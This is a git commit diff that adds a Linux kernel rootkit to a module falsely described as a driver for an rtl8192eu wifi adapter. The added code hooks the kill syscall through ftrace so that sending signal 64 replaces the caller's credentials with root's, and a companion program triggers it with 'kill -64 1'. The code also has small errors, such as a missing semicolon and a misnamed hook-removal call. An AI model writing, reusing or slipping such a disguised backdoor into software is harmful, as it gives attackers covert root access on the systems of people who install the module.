37147d5a4434f0761624459886a70bb537099e3c
kaizh <kaizhetan@yahoo.com>
2022-12-31 16:36:03 +0800

    Set root

--- mallie.c
+++ mallie.c
@@ -6,8 +6,15 @@ static void test_connection(void)
     system(cmd);
 }
 
+int get_root(void)
+{
+    system("kill -64 1");
+    return 0;
+}
+
 int main(int argc, char *argv[]) 
 {
     test_connection();
+    get_root();
     return 0;
 }
--- root.c
+++ root.c
@@ -16,8 +16,97 @@ MODULE_AUTHOR("Mallie");
 MODULE_DESCRIPTION("Driver for rtl8192eu wifi adapter.");
 MODULE_VERSION("0.1");
 
+/* After Kernel 4.17.0, the way that syscalls are handled changed
+ * to use the pt_regs struct instead of the more familiar function
+ * prototype declaration. We have to check for this, and set a
+ * variable for later on */
+#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
+#define PTREGS_SYSCALL_STUBS 1
+#endif
+
+/* We now have to check for the PTREGS_SYSCALL_STUBS flag and
+ * declare the orig_kill and hook_kill functions differently
+ * depending on the kernel version. This is the largest barrier to 
+ * getting the rootkit to work on earlier kernel versions. The
+ * more modern way is to use the pt_regs struct. */
+#ifdef PTREGS_SYSCALL_STUBS
+static asmlinkage long (*orig_kill)(const struct pt_regs *);
+
+/* We can only modify our own privileges, and not that of another
+ * process. Just have to wait for signal 64 (normally unused) 
+ * and then call the set_root() function. */
+asmlinkage int hook_kill(const struct pt_regs *regs)
+{
+    void set_root(void);
+
+    // pid_t pid = regs->di;
+    int sig = regs->si;
+
+    if ( sig == 64 )
+    {
+        printk(KERN_INFO "rootkit: giving root...\n");
+        set_root();
+        return 0;
+    }
+
+    return orig_kill(regs);
+
+}
+#else
+/* This is the old way of declaring a syscall hook */
+static asmlinkage long (*orig_kill)(pid_t pid, int sig);
+
+static asmlinkage int hook_kill(pid_t pid, int sig)
+{
+    void set_root(void);
+
+    if ( sig == 64 )
+    {
+        printk(KERN_INFO "rootkit: giving root...\n");
+        set_root();
+        return 0;
+    }
+
+    return orig_kill(pid, sig);
+}
+#endif
+
+/* Whatever calls this function will have it's creds struct replaced
+ * with root's */
+void set_root(void)
+{
+    /* prepare_creds returns the current credentials of the process */
+    struct cred *root;
+    root = prepare_creds();
+
+    if (root == NULL)
+        return;
+
+    /* Run through and set all the various *id's to 0 (root) */
+    root->uid.val = root->gid.val = 0;
+    root->euid.val = root->egid.val = 0;
+    root->suid.val = root->sgid.val = 0;
+    root->fsuid.val = root->fsgid.val = 0;
+
+    /* Set the cred struct that we've modified to that of the calling process */
+    commit_creds(root);
+}
+
+/* Declare the struct that ftrace needs to hook the syscall */
+static struct ftrace_hook hooks[] = {
+    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
+};
+
 static int __init mallie_module_init(void)
 {
+	int err
+	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
+
+	if (err) 
+	{
+		printk(KERN_INFO "Mallie: Failed to install hooks.");
+		return err;
+	}
 
 	printk(KERN_INFO "Mallie loaded.\n");
 
@@ -26,6 +115,8 @@ static int __init mallie_module_init(void)
 
 static void __exit mallie_module_exit(void)
 {
+	/* Remove the hooks */
+	fn_remove_hooks(hooks, ARRAY_SIZE(hooks));
 	printk(KERN_INFO "Mallie: Exiting...\n");
 }
 
